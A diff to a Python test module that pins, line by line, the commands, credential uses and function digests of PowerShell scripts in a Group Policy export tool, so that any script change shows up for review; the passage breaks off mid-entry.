@@ -10,8 +10,8 @@ PowerShell language parser (``tests/powershell/Get-ScriptCallInventory.ps1``).
    holds, per script, a canonical order-preserving serialization of the WHOLE
    AST (one line per node: its role in the parent, its type, and every
    semantically relevant property — operators, names, string values, flags,
-   ``#Requires``, attributes, every argument) plus a digest of the source text
-   (CRLF normalized). ``test_inventory_matches_golden`` fails on ANY difference,
+   ``#Requires``, attributes, every argument) plus a digest of the exact source
+   bytes (LF pinned by .gitattributes). ``test_inventory_matches_golden`` fails on ANY difference,
    so every edit — a reorder, a changed argument, a new index assignment or
    ``#Requires`` line, even a comment — must be regenerated and its diff
    reviewed. Meta-tests prove the serializer covers every AST node type and
@@ -26,8 +26,11 @@ PowerShell language parser (``tests/powershell/Get-ScriptCallInventory.ps1``).
    forms, a type-reference denylist, a closed set of AST node types, the exact
    local functions, exact scheduled-task argument vectors, exact pinning of
    every binding of every write/receiver/exec variable and what it reads, no
-   provider/global/automatic-variable writes, and the exact text plus
-   control-flow context of every write/delete/exec operation. It is a floor,
+   provider/global/automatic-variable writes, the exact text plus control-flow
+   context of every command invocation and write/delete/exec/lifetime .NET
+   call, digests of every local function body and script param block, the
+   exact uses of secret-bearing variables, no remote paths in command
+   arguments, and the shared TaskName validator. It is a floor,
    not a proof: an admitted change still shows up as a golden diff.
 
 Scope:
@@ -235,7 +238,6 @@ POLICIES: dict[str, ScriptPolicy] = {
                 "guid::TryParse",
                 "math::Max",
                 "string::Equals",
-                "string::IsNullOrWhiteSpace",
             }
         ),
         instance_methods=frozenset(
@@ -340,7 +342,6 @@ POLICIES: dict[str, ScriptPolicy] = {
                 "Text.UTF8Encoding::new",
                 "datetime::TryParseExact",
                 "string::Equals",
-                "string::IsNullOrWhiteSpace",
                 "timespan::FromDays",
                 "timespan::FromHours",
             }
@@ -1832,10 +1833,10 @@ LOCAL_FUNCTION_BODIES: dict[str, dict[str, str]] = {
             "641bc5815235b9475ec326e3993752ac02a926fef931b616c15c68d99f802858"
         ),
         "Assert-GpoLensCollectionOwner": (
-            "e740eccc68f64c0de6205a6b41d9f711ec007d44005a95898ae03a7b6e048c63"
+            "a9defc5b87009a3010dee3e57aecac76369ec4644c1cbae2472b236b9c981f7d"
         ),
         "Invoke-GpoLensCollection": (
-            "db7b24ed2e8b5fc621a596f8fab2b06ca6fe90b4088da6c194223ce31cacca99"
+            "3224d100fd66dae939805becde789ce6e7b51028adacdddd9163aa63cf1c3221"
         ),
     },
     "GpoLensCollectionMarker.ps1": {
@@ -1854,9 +1855,98 @@ LOCAL_FUNCTION_BODIES: dict[str, dict[str, str]] = {
             "3167a68a6db407a4a1af18d6df9046eab0e70cb61a50e2950c93044b3b815ea0"
         ),
         "Set-GpoLensCollectionOwner": (
-            "f454df3d2b26c45ae4061fb5e40fe9a4c606971defb98eb37f9e15c95ee2a0a5"
+            "afb35b5aa433fc5611ac9dd1a2c1cb4ca4cd567b099ae0bdd4f6cc767bd4bb35"
         ),
     },
+}
+
+# Exact uses of secret-bearing variables (see check_secret_uses): (variable,
+# enclosing function, normalized statement). HAND-MAINTAINED.
+SECRET_USES: dict[str, tuple[tuple[str, str, str], ...]] = {
+    "Export-GpoEstate.ps1": (),
+    "Export-GroupMembers.ps1": (
+        ("credential", "", "[System.Management.Automation.PSCredential]$Credential"),
+        ("adparams", "", "$adParams = @{}"),
+        ("credential", "", "$Credential"),
+        ("adparams", "", "$adParams.Credential = $Credential"),
+        ("credential", "", "$adParams.Credential = $Credential"),
+        ("adparams", "", "Get-ADGroupMember -Identity $sid -Recursive @adParams -ErrorAction Stop"),
+    ),
+    "Export-Principals.ps1": (
+        ("credential", "", "[System.Management.Automation.PSCredential]$Credential"),
+        ("adparams", "", "$adParams = @{}"),
+        ("credential", "", "$Credential"),
+        ("adparams", "", "$adParams.Credential = $Credential"),
+        ("credential", "", "$adParams.Credential = $Credential"),
+        ("adparams", "", "Get-ADDomain @adParams"),
+        (
+            "adparams",
+            "",
+            (
+                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
+                '"(objectClass=groupPolicyContainer)" -Properties '
+                "nTSecurityDescriptor, displayName @adParams"
+            ),
+        ),
+        ("adparams", "", "$adParams = @{}"),
+        ("credential", "", "$Credential"),
+        ("adparams", "", "$adParams.Credential = $Credential"),
+        ("credential", "", "$adParams.Credential = $Credential"),
+        ("adparams", "", "Get-ADDomain @adParams"),
+        (
+            "adparams",
+            "",
+            (
+                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties "
+                "objectClass, sAMAccountName, name @adParams -ErrorAction Stop"
+            ),
+        ),
+    ),
+    "Run-GpoLensCollection.ps1": (),
+    "GpoLensCollectionMarker.ps1": (),
+    "Register-GpoLensCollection.ps1": (
+        ("credential", "", "[Parameter(ParameterSetName = 'Service')] [pscredential]$Credential"),
+        ("credential", "", "-not $Credential"),
+        (
+            "credential",
+            "",
+            (
+                "$Credential = Get-Credential -UserName $ServiceAccount -Message "
+                "'Collection task credentials (saved only by Windows Task "
+                "Scheduler)'"
+            ),
+        ),
+        ("credential", "", "-not $Credential -or $Credential.UserName -ne $ServiceAccount"),
+        ("credential", "", "-not $Credential -or $Credential.UserName -ne $ServiceAccount"),
+        ("taskpassword", "", "$taskPassword = $Credential.GetNetworkCredential().Password"),
+        ("credential", "", "$taskPassword = $Credential.GetNetworkCredential().Password"),
+        (
+            "taskpassword",
+            "",
+            (
+                "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
+                "-User $ServiceAccount -Password $taskPassword -Force"
+            ),
+        ),
+        ("taskpassword", "", "$taskPassword = $null"),
+        ("credential", "", "$Credential = $null"),
+    ),
+}
+
+# SHA-256 of each script's attributes + param block rows. HAND-MAINTAINED.
+SCRIPT_HEADERS: dict[str, str] = {
+    "Export-GpoEstate.ps1": ("6dbe34329001a4e2fe1c85e31716c69c9253ba4cbda2b9f10d8ed297910ffdb7"),
+    "Export-GroupMembers.ps1": ("49a4d9070b03f9ca32a4e281eb1a8ae4b106eda3ae7e94573b508dc50c6c30e5"),
+    "Export-Principals.ps1": ("dfa22517b497f3eeafb9a18678ff7495e2bcd72c74bce468b6beb89862d6efd4"),
+    "Run-GpoLensCollection.ps1": (
+        "874b6828b646e8479ce7408283e78169b4c84b4f8c03d9445ed230d941bbe733"
+    ),
+    "GpoLensCollectionMarker.ps1": (
+        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    ),
+    "Register-GpoLensCollection.ps1": (
+        "98c57e75887fbdc508701b1c27836d9a5566b4d7fd0842b689650eb66a6a5036"
+    ),
 }
 
 # Pinned write/exec operations with their control-flow context (see
@@ -1865,11 +1955,49 @@ LOCAL_FUNCTION_BODIES: dict[str, dict[str, str]] = {
 GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
     "Export-GpoEstate.ps1": (
         (
+            "Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop",
+            ("function New-GpoExportZip",),
+        ),
+        (
+            "Test-Path -LiteralPath $archive",
+            (
+                "function New-GpoExportZip",
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
             "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
             (
                 "function New-GpoExportZip",
                 "try",
                 "if (Test-Path -LiteralPath $archive) after []",
+            ),
+        ),
+        (
+            (
+                "Get-ChildItem -LiteralPath $ExportPath -Recurse -File ` -ErrorAction "
+                "SilentlyContinue -ErrorVariable +zipEnumErr"
+            ),
+            (
+                "function New-GpoExportZip",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host "Done: $archive ($($diskFiles.Count) files)"',
+            (
+                "function New-GpoExportZip",
+                "try",
+                "guard if ($zipEnumErr) -> throw",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $archive",
+            (
+                "function New-GpoExportZip",
+                "catch []",
+                "if-condition after []",
             ),
         ),
         (
@@ -1881,6 +2009,27 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Get-Module -ListAvailable -Name $mod",
+            (
+                "foreach ($mod in @('GroupPolicy','ActiveDirectory'))",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Write-Error \"Required module '$mod' is not available. Install RSAT.\"",
+            (
+                "foreach ($mod in @('GroupPolicy','ActiveDirectory'))",
+                "if (-not (Get-Module -ListAvailable -Name $mod)) after []",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $OutputRoot",
+            (
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
             "New-Item -ItemType Directory -Force -Path $OutputRoot",
             (
                 "try",
@@ -1888,11 +2037,138 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Out-Null",
+            (
+                "try",
+                "if (-not (Test-Path -LiteralPath $OutputRoot)) after []",
+            ),
+        ),
+        (
+            'Join-Path $OutputRoot "_writetest_.tmp"',
+            ("try",),
+        ),
+        (
             "Remove-Item $testFile -Force",
             ("try",),
         ),
         (
+            "Write-Error \"OutputRoot '$OutputRoot' is not writable: $($_.Exception.Message)\"",
+            ("catch []",),
+        ),
+        (
+            "Get-ADDomain",
+            (),
+        ),
+        (
+            'Get-Date -Format "yyyyMMdd-HHmmss"',
+            (),
+        ),
+        (
+            'Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
+            (),
+        ),
+        (
+            "Get-GPO -All",
+            (),
+        ),
+        (
+            "Get-ADOrganizationalUnit -Filter *",
+            (),
+        ),
+        (
+            (
+                "Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
+                "'msWMI-Name' -ErrorAction SilentlyContinue"
+            ),
+            (),
+        ),
+        (
+            (
+                "Get-ADObject -SearchBase "
+                '"CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '
+                '"(objectClass=site)" -ErrorAction SilentlyContinue'
+            ),
+            (),
+        ),
+        (
+            "Get-ADRootDSE",
+            (),
+        ),
+        (
+            "Get-ChildItem $src -Recurse -File -ErrorAction SilentlyContinue",
+            (
+                "if ($DryRun) after []",
+                "if (-not $SkipSysvol) after []",
+            ),
+        ),
+        (
+            "Measure-Object -Property Length -Sum",
+            (
+                "if ($DryRun) after []",
+                "if (-not $SkipSysvol) after []",
+            ),
+        ),
+        (
+            'Write-Host "DryRun: would export the following:"',
+            ("if ($DryRun) after []",),
+        ),
+        (
+            'Write-Host " Domain: $($dom.DNSRoot)"',
+            ("if ($DryRun) after []",),
+        ),
+        (
+            'Write-Host " GPOs: $gpoCount"',
+            ("if ($DryRun) after []",),
+        ),
+        (
+            'Write-Host " OUs: $ouCount"',
+            ("if ($DryRun) after []",),
+        ),
+        (
+            'Write-Host " WMI filters: $wmiCount"',
+            ("if ($DryRun) after []",),
+        ),
+        (
+            'Write-Host " AD sites: $siteCount"',
+            ("if ($DryRun) after []",),
+        ),
+        (
+            'Write-Host " Output dir: $out"',
+            ("if ($DryRun) after []",),
+        ),
+        (
+            "Write-Host \" SYSVOL: $(if ($SkipSysvol) {'skipped'} else {$sysvolSizeStr})\"",
+            ("if ($DryRun) after []",),
+        ),
+        (
+            'Write-Host " Zip: $(if ($NoZip) {\'skipped\'} else {"$out.zip"})"',
+            ("if ($DryRun) after []",),
+        ),
+        (
             "New-Item -ItemType Directory -Force -Path (Join-Path $out 'reports')",
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "Join-Path $out 'reports'",
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "Out-Null",
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            'Write-Host "Exporting $($dom.DNSRoot) -> $out"',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "Write-Progress -Activity $Activity -PercentComplete $pct",
+            (
+                "guard if ($DryRun) -> return",
+                "function Set-SectionProgress",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "GPO settings (XML reports)" -Section $sectionNum',
             ("guard if ($DryRun) -> return",),
         ),
         (
@@ -1903,6 +2179,31 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             (
                 "guard if ($DryRun) -> return",
                 "try",
+            ),
+        ),
+        (
+            "Join-Path $out 'AllGPOs.xml'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Write-Warning "Combined GPO report failed: $($_.Exception.Message)"',
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            (
+                'Write-Progress -Activity "GPO settings (XML reports)" ` -Status "$i / '
+                '$gpoCount" -PercentComplete ([math]::Round(($sectionNum - 1 + ($i / '
+                "$gpoCount)) / $totalSections * 100))"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
             ),
         ),
         (
@@ -1917,10 +2218,83 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            'Join-Path $out "reports\\${safe}__$($gpo.Id).xml"',
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "try",
+            ),
+        ),
+        (
+            (
+                "Write-Warning \"GPO report failed for '$($gpo.DisplayName)' ($($gpo.Id)): "
+                '$($_.Exception.Message)"'
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "foreach ($gpo in $allGpos)",
+                "catch []",
+            ),
+        ),
+        (
+            (
+                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
+                '"(objectClass=groupPolicyContainer)" ` -Properties displayName -ErrorAction '
+                "Stop"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            (
+                "ForEach-Object { [pscustomobject]@{ Id = $_.Name.Trim('{}'); DisplayName = "
+                "$_.displayName } }"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 4",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
             "Set-Content (Join-Path $out 'gpo-inventory.json') -Encoding UTF8",
             (
                 "guard if ($DryRun) -> return",
                 "try",
+            ),
+        ),
+        (
+            "Join-Path $out 'gpo-inventory.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            (
+                'Write-Warning "Inaccessible GPO detected: $guid$(if ($gpc.displayName) { " '
+                '($($gpc.displayName))" })"'
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gpc in $allGpc)",
+                "if (-not $knownIds.Contains($guid)) after []",
+            ),
+        ),
+        (
+            'Write-Warning "GPC completeness cross-check failed: $($_.Exception.Message)"',
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
             ),
         ),
         (
@@ -1931,6 +2305,20 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Join-Path $out 'collection-errors.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "if ($collectionErrors.Count -eq 0) after []",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 4",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($collectionErrors.Count -eq 0)]",
+            ),
+        ),
+        (
             "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
             (
                 "guard if ($DryRun) -> return",
@@ -1938,7 +2326,98 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Join-Path $out 'collection-errors.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($collectionErrors.Count -eq 0)]",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "GPO metadata" -Section $sectionNum',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            (
+                "Select-Object DisplayName, Id, GpoStatus, CreationTime, ModificationTime, "
+                "@{n='UserDSVersion';e={$_.User.DSVersion}}, "
+                "@{n='UserSysvolVersion';e={$_.User.SysvolVersion}}, "
+                "@{n='ComputerDSVersion';e={$_.Computer.DSVersion}}, "
+                "@{n='ComputerSysvolVersion';e={$_.Computer.SysvolVersion}}, "
+                "@{n='WmiFilter';e={$_.WmiFilter.Name}}"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 4",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
             "Set-Content (Join-Path $out 'gpo-metadata.json') -Encoding UTF8",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Join-Path $out 'gpo-metadata.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "Inheritance (gp-inheritance)" -Section $sectionNum',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "Get-ADOrganizationalUnit -Filter *",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Select-Object -Expand DistinguishedName",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Get-GPInheritance -Target $t",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "try",
+            ),
+        ),
+        (
+            "Select-Object DisplayName, GpoId, Enabled, Enforced, Order, Target",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "try",
+            ),
+        ),
+        (
+            'Write-Warning "GPInheritance failed for $t : $($_.Exception.Message)"',
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($t in $targets)",
+                "catch []",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 6",
             (
                 "guard if ($DryRun) -> return",
                 "try",
@@ -1952,7 +2431,81 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Join-Path $out 'gp-inheritance.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "OU tree" -Section $sectionNum',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "Get-ADOrganizationalUnit -Filter * -Properties gPLink, gPOptions",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Select-Object DistinguishedName, Name, gPLink, gPOptions",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 4",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
             "Set-Content (Join-Path $out 'ou-tree.json') -Encoding UTF8",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Join-Path $out 'ou-tree.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "AD sites" -Section $sectionNum',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "Get-ADRootDSE",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            (
+                'Get-ADObject -SearchBase "CN=Sites,$configNC" -LDAPFilter '
+                '"(objectClass=site)" ` -Properties gPLink, gPOptions, name'
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Select-Object DistinguishedName, Name, gPLink, gPOptions",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 4",
             (
                 "guard if ($DryRun) -> return",
                 "try",
@@ -1966,7 +2519,192 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Join-Path $out 'sites.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "WMI filters" -Section $sectionNum',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            (
+                "Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
+                "'msWMI-Name', 'msWMI-Parm2'"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Select-Object @{n='Name';e={$_.'msWMI-Name'}}, @{n='Query';e={$_.'msWMI-Parm2'}}",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 4",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
             "Set-Content (Join-Path $out 'wmi-filters.json') -Encoding UTF8",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Join-Path $out 'wmi-filters.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "Principals (SID -> name)" -Section $sectionNum',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            (
+                "Get-ChildItem -LiteralPath (Join-Path $out 'reports') -Filter '*.xml' "
+                "-ErrorAction SilentlyContinue"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Join-Path $out 'reports'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Join-Path $out 'AllGPOs.xml'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $allXmlPath",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Get-Item -LiteralPath $allXmlPath",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if (Test-Path -LiteralPath $allXmlPath) after []",
+            ),
+        ),
+        (
+            "Get-Content -LiteralPath $f.FullName -Raw -ErrorAction Stop",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($f in $xmlFiles)",
+                "try",
+            ),
+        ),
+        (
+            "Join-Path $out 'gpo-metadata.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $metaPath",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Get-Content -LiteralPath $metaPath -Raw",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if (Test-Path -LiteralPath $metaPath) after []",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " Found $($allSids.Count) unique SIDs to resolve"',
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Sort-Object",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($sid in ($allSids | Sort-Object))",
+            ),
+        ),
+        (
+            "New-Object System.Security.Principal.SecurityIdentifier($sid)",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($sid in ($allSids | Sort-Object))",
+                "try",
+            ),
+        ),
+        (
+            "Where-Object { $_ -match '^S-1-5-21-' -and $principals[$_].type -eq 'Unresolved' }",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " Resolving $($domainSids.Count) domain SIDs via Get-ADObject..."',
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+            ),
+        ),
+        (
+            (
+                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties objectClass, "
+                "sAMAccountName, name -ErrorAction Stop"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "if ($domainSids.Count -gt 0) after []",
+                "foreach ($sid in $domainSids)",
+                "try",
+            ),
+        ),
+        (
+            "Get-Date -Format 'o'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 5",
             (
                 "guard if ($DryRun) -> return",
                 "try",
@@ -1980,6 +2718,77 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Join-Path $out 'principals.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " Resolved: $resolved, Unresolved: $unresolved"',
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Write-Warning "Principals collection failed: $($_.Exception.Message)"',
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "Group membership" -Section $sectionNum',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "Where-Object { $principals[$_].type -eq 'Group' }",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " Expanding $($groupSids.Count) groups..."',
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "Get-ADGroupMember -Identity $gSid -Recursive -ErrorAction Stop",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gSid in $groupSids)",
+                "try",
+            ),
+        ),
+        (
+            "ForEach-Object { $_.SID.Value }",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+                "foreach ($gSid in $groupSids)",
+                "try",
+            ),
+        ),
+        (
+            "Get-Date -Format 'o'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 5",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
             "Set-Content (Join-Path $out 'group-members.json') -Encoding UTF8",
             (
                 "guard if ($DryRun) -> return",
@@ -1987,7 +2796,56 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Join-Path $out 'group-members.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Write-Host " Expanded: $groupsExpanded, Failed: $groupsFailed"',
+            (
+                "guard if ($DryRun) -> return",
+                "try",
+            ),
+        ),
+        (
+            'Write-Warning "Group membership collection failed: $($_.Exception.Message)"',
+            (
+                "guard if ($DryRun) -> return",
+                "catch []",
+            ),
+        ),
+        (
+            'Set-SectionProgress -Activity "SYSVOL copy" -Section $sectionNum',
+            ("guard if ($DryRun) -> return",),
+        ),
+        (
+            "Join-Path $out 'SYSVOL-Policies'",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
             "New-Item -ItemType Directory -Force -Path $dest",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
+            "Out-Null",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
+            (
+                "Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction SilentlyContinue "
+                "-ErrorVariable +srcErr"
+            ),
             (
                 "guard if ($DryRun) -> return",
                 "else of [($SkipSysvol)]",
@@ -2007,6 +2865,35 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
         ),
         (
             (
+                'Write-Warning "SYSVOL copy failed for policy folder $($pf.Name): '
+                '$($_.Exception.Message)"'
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "foreach ($pf in $policyFolders)",
+                "catch []",
+            ),
+        ),
+        (
+            "Get-ChildItem -LiteralPath $src -File -ErrorAction SilentlyContinue",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
+            (
+                "ForEach-Object { Copy-Item -LiteralPath $_.FullName -Destination $dest -Force "
+                "-ErrorAction SilentlyContinue }"
+            ),
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
+            (
                 "Copy-Item -LiteralPath $_.FullName -Destination $dest -Force -ErrorAction "
                 "SilentlyContinue"
             ),
@@ -2017,7 +2904,14 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
-            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
+            "Get-ChildItem -LiteralPath $dest -Recurse -File -ErrorAction SilentlyContinue",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 4",
             (
                 "guard if ($DryRun) -> return",
                 "else of [($SkipSysvol)]",
@@ -2029,10 +2923,100 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             (
                 "guard if ($DryRun) -> return",
                 "else of [($SkipSysvol)]",
+                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
+            ),
+        ),
+        (
+            "Join-Path $out 'collection-errors.json'",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
+            ),
+        ),
+        (
+            'Write-Warning "SYSVOL copy produced no files: $detail"',
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
+            ),
+        ),
+        (
+            "ConvertTo-Json -Depth 4",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
                 (
                     "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                     "($sysvolErrors -eq 0)]"
                 ),
+            ),
+        ),
+        (
+            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
+            (
+                "guard if ($DryRun) -> return",
+                "else of [($SkipSysvol)]",
+                (
+                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
